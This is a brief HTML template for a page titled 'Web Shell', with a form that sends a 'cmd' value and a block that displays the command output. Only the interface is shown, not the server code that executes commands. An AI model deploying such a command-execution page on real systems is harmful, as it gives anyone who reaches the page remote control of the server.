<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell</title>
</head>
<body>
    <h1>Web Shell</h1>
    <form method="get">
        <input type="text" name="cmd" placeholder="Enter command" style="width: 400px;">
        <input type="submit" value="Execute">
    </form>
    <hr>
    {% if cmd %}
        <h2>Output:</h2>
        <pre>{{ output }}</pre>
    {% endif %}
</body>
</html>
